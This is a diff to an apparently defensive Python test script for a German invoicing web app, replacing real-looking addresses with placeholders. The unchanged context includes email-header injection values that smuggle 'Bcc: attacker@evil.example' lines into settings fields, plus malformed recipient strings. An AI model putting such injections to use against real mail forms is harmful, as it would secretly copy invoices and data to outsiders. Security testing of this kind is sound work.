@@ -10,7 +10,7 @@ clear_rl()
 c = authed()
 t = page_token(c, '/index.php?p=customer_edit')
 r = c.post('/index.php?p=customer_edit', {'csrf': t, 'name': 'Beispiel GmbH', 'contact': 'Erika Muster', 'email': 'erika@example.com', 'street': 'Hauptstr. 5',
-                                           'zip': '26871', 'city': 'Papenburg', 'country': 'DE', 'vat_id': '', 'buyer_reference': ''})
+                                           'zip': '12345', 'city': 'Musterstadt', 'country': 'DE', 'vat_id': '', 'buyer_reference': ''})
 cid = sql('select max(id) from customers')
 
 
@@ -153,7 +153,7 @@ act(s, xinv, 'issue')
 tokx = sql(f'select public_token from invoices where id={xinv}')
 # Einstellungen mit Payloads
 tt = page_token(s)
-base_set = {'csrf': tt, 'action': 'save', 'COMPANY_NAME': 'Test IT-Service', 'COMPANY_OWNER': payloads[0], 'COMPANY_STREET': payloads[1], 'COMPANY_ZIP': '26871', 'COMPANY_CITY': payloads[2],
+base_set = {'csrf': tt, 'action': 'save', 'COMPANY_NAME': 'Test IT-Service', 'COMPANY_OWNER': payloads[0], 'COMPANY_STREET': payloads[1], 'COMPANY_ZIP': '12345', 'COMPANY_CITY': payloads[2],
             'COMPANY_COUNTRY': 'DE', 'COMPANY_EMAIL': 'rechnung@example.de', 'COMPANY_PHONE': payloads[3], 'COMPANY_TAX_NUMBER': payloads[4], 'COMPANY_VAT_ID': '',
             'COMPANY_IBAN': 'DE89 3704 0044 0532 0130 00', 'COMPANY_BIC': payloads[0], 'COMPANY_BANK': payloads[1], 'INVOICE_PREFIX': 'RE', 'PAYMENT_DAYS': '14',
             'SMTP_HOST': '127.0.0.1', 'SMTP_PORT': '2525', 'SMTP_SECURE': 'none', 'SMTP_USER': payloads[0], 'SMTP_PASS': '', 'MAIL_FROM': 'rechnung@example.de',
@@ -235,7 +235,7 @@ for f in glob.glob(''+os.environ.get('RG_MAILS','/tmp/mails')+'/*.eml'):
     os.remove(f)
 tt = page_token(s)
 crlf = dict(base_set)
-crlf.update({'csrf': tt, 'COMPANY_OWNER': 'Kai Test', 'COMPANY_STREET': 'Musterstr. 1', 'COMPANY_CITY': 'Papenburg', 'COMPANY_PHONE': '+49 4961 123', 'COMPANY_TAX_NUMBER': '12/345/67890', 'COMPANY_BIC': '', 'COMPANY_BANK': '', 'SMTP_USER': '',
+crlf.update({'csrf': tt, 'COMPANY_OWNER': 'Kai Test', 'COMPANY_STREET': 'Musterstr. 1', 'COMPANY_CITY': 'Musterstadt', 'COMPANY_PHONE': '+49 123 456789', 'COMPANY_TAX_NUMBER': '12/345/67890', 'COMPANY_BIC': '', 'COMPANY_BANK': '', 'SMTP_USER': '',
              'COMPANY_NAME': 'Test IT-Service\r\nBcc: attacker@evil.example\r\nX-Injected: 1', 'MAIL_FROM_NAME': 'Name\r\nBcc: attacker2@evil.example'})
 rr = s.post('/index.php?p=settings', crlf)
 ci2, _ = draft(s, desc=('CRLF-Test',))
@@ -258,7 +258,7 @@ for tv in ['a@b.de\r\nBcc: c@d.de', 'a@b.de,c@d.de', 'a@b.de;c@d.de', 'a@b.de c@
         bad_to.append(tv[:20])
 rec('F4', 'H', 'Ungültige/mehrfache Empfängeradressen (CRLF, Komma, Semikolon) werden abgelehnt', not bad_to, bad_to)
 # Settings zurückstellen
-s.post('/index.php?p=settings', dict(base_set, **{'csrf': page_token(s), 'COMPANY_OWNER': 'Kai Test', 'COMPANY_STREET': 'Musterstr. 1', 'COMPANY_CITY': 'Papenburg', 'COMPANY_PHONE': '+49 4961 123',
+s.post('/index.php?p=settings', dict(base_set, **{'csrf': page_token(s), 'COMPANY_OWNER': 'Kai Test', 'COMPANY_STREET': 'Musterstr. 1', 'COMPANY_CITY': 'Musterstadt', 'COMPANY_PHONE': '+49 123 456789',
                                                  'COMPANY_TAX_NUMBER': '12/345/67890', 'COMPANY_BIC': '', 'COMPANY_BANK': '', 'SMTP_USER': '', 'MAIL_FROM_NAME': 'Test IT-Service'}))
 # Location-Header
 loc_bad = []
